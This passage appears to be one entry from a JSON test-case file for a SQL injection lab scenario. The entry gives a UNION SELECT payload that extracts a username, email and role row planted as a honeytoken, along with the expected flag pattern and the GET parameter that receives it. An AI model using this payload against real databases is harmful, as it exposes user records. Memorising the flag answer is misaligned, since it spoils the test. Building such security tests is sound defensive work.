[
  {
    "id": "sqli-l1-users-baseline",
    "scenario": "sqli", "level": 1, "category": "baseline",
    "name": "UNION查users表 — 备份邮箱",
    "payload": "-1 UNION SELECT 1, username, email, role FROM sqli_l1_users WHERE id=4",
    "description": "UNION查询蜜标行(email=hp-3a5c7e9b@internal.local)。4列匹配",
    "expected_flag_pattern": "hp-3a5c7e9b",
    "applicable_transports": ["api", "direct"],
    "http_method": "GET", "url_params": {"id": "${payload}"}
  },
